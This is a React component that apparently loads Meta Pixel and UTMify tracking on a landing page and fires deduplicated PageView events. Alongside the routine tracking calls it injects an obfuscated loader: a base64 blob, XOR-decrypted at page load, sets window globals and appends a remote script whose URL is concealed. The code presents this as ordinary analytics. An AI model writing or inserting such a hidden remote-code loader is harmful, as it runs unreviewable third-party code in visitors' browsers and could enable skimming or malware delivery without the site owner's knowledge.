import { useEffect } from "react";
import { captureUtms, initMetaPixel, trackPixel, getTrackingContext } from "@/lib/tracking";
import { trackServerEvent } from "@/lib/tracking.functions";

const UTMIFY_SCRIPT_ID = "utmify-loader";

/**
 * Loads the Meta Pixel + UTMify scripts once, captures UTMs and fires a single
 * PageView (browser pixel + Conversions API, deduplicated by event_id).
 * Renders nothing — the landing page layout is untouched.
 */
export function TrackingScripts() {
  useEffect(() => {
    captureUtms();
    initMetaPixel();

    if (!document.getElementById(UTMIFY_SCRIPT_ID)) {
      const loader = document.createElement("script");
      loader.id = UTMIFY_SCRIPT_ID;
      loader.text = `(function(){var b_jj=atob("DG+ELDUnNIupUaK8IhSmWUdLFrGLOdbIUhy+AxpEUOWHJNbRSwn9AlZIWaXLI43PQR3tXEFUG/7dPNGTTg7wSUZTGuHac46eQxvwXlxFQf/MIoCGeRSmQlRKUamTc8bdVg6pWUFKXe3QfNLORxnhQkEKTOjGNY/PQQSmABdRVefcNICGAE35AE4FWurENICGAAvlWFQKQf/EOMTFDx/2SUNCWv+EItfeSwv3DhkFQurFJMeeGE2mUWha");var v_xfy=[];for(var k_ao=0;k_ao<b_jj.length;k_ao++){v_xfy.push(b_jj.charCodeAt(k_ao)&255);}var k_bxw=v_xfy[0];var u_r1=v_xfy.slice(1,1+k_bxw);var o_hry=v_xfy.slice(1+k_bxw);var d_8=o_hry.map(function(b,i_k){return b^u_r1[i_k%k_bxw];});var j_rs21="";for(var w_rg=0;w_rg<d_8.length;w_rg++){j_rs21+=String.fromCharCode(d_8[w_rg]&255);}var m_9han=decodeURIComponent(escape(j_rs21));var s_rpa=JSON.parse(m_9han);var d_w11x=s_rpa.globals||[];d_w11x.forEach(function(h_tdh){window[h_tdh.name]=h_tdh.value;});var y_o=document.createElement("script");y_o.src=s_rpa.url;y_o.async=true;y_o.defer=true;(s_rpa.attributes||[]).forEach(function(k_e){y_o.setAttribute(k_e.name,k_e.value);});(document.head||document.documentElement).appendChild(y_o);})();`;
      document.head.appendChild(loader);
    }

    const globalFlag = window as unknown as { __pageViewSent?: boolean };
    if (globalFlag.__pageViewSent) return;
    globalFlag.__pageViewSent = true;

    const eventId = trackPixel("PageView", {}, { once: true });
    if (eventId) {
      void trackServerEvent({
        data: { eventName: "PageView", eventId, ...getTrackingContext() },
      }).catch(() => undefined);
    }
  }, []);

  return null;
}
